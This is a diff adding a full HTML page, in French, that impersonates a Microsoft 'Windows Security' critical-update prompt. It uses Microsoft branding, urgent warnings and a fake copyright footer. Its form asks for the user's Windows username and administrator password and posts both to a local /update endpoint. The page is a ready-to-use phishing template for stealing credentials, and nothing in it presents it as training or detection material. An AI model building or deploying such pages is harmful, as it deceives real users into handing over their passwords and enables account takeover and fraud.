@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mise à jour requise - Windows Security</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f0f0;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            padding: 30px;
+            width: 100%;
+            max-width: 500px;
+        }
+        
+        .header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+        }
+        
+        .windows-logo {
+            width: 50px;
+            height: 50px;
+            background: #0078d4;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            margin-right: 15px;
+        }
+        
+        .title {
+            color: #333;
+            font-size: 20px;
+            font-weight: 600;
+        }
+        
+        .alert {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 6px;
+            padding: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .alert-icon {
+            color: #856404;
+            font-size: 18px;
+            margin-right: 10px;
+        }
+        
+        .alert-text {
+            color: #856404;
+            font-size: 14px;
+        }
+        
+        .info-box {
+            background: #f8f9fa;
+            border-radius: 6px;
+            padding: 20px;
+            margin-bottom: 25px;
+        }
+        
+        .info-title {
+            color: #333;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+        
+        .info-list {
+            list-style: none;
+            margin-bottom: 15px;
+        }
+        
+        .info-list li {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 8px;
+            padding-left: 20px;
+            position: relative;
+        }
+        
+        .info-list li:before {
+            content: "•";
+            color: #0078d4;
+            position: absolute;
+            left: 0;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+        }
+        
+        input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e1e5e9;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.3s ease;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: #0078d4;
+        }
+        
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        
+        .btn:hover {
+            background: #005a9e;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="windows-logo">⊞</div>
+            <div class="title">Windows Security</div>
+        </div>
+        
+        <div class="alert">
+            <span class="alert-icon">⚠️</span>
+            <span class="alert-text">Mise à jour de sécurité critique requise</span>
+        </div>
+        
+        <div class="info-box">
+            <div class="info-title">Détails de la mise à jour :</div>
+            <ul class="info-list">
+                <li>Correctif de sécurité pour Windows Defender</li>
+                <li>Mise à jour des définitions antivirus</li>
+                <li>Correction de vulnérabilités critiques</li>
+                <li>Amélioration de la protection contre les menaces</li>
+            </ul>
+            <div style="color: #dc3545; font-size: 12px; font-weight: 600;">
+                ⚠️ Cette mise à jour doit être installée immédiatement pour protéger votre système.
+            </div>
+        </div>
+        
+        <form method="post" action="/update">
+            <div class="form-group">
+                <label for="username">Nom d'utilisateur Windows</label>
+                <input type="text" id="username" name="username" placeholder="Votre nom d'utilisateur" required>
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Mot de passe administrateur</label>
+                <input type="password" id="password" name="password" placeholder="Votre mot de passe" required>
+            </div>
+            
+            <button type="submit" class="btn">Installer la mise à jour maintenant</button>
+        </form>
+        
+        <div class="footer">
+            <p>© 2024 Microsoft Corporation. Tous droits réservés.</p>
+            <p>Windows Security - Protection en temps réel activée</p>
+        </div>
+    </div>
+</body>
+</html>
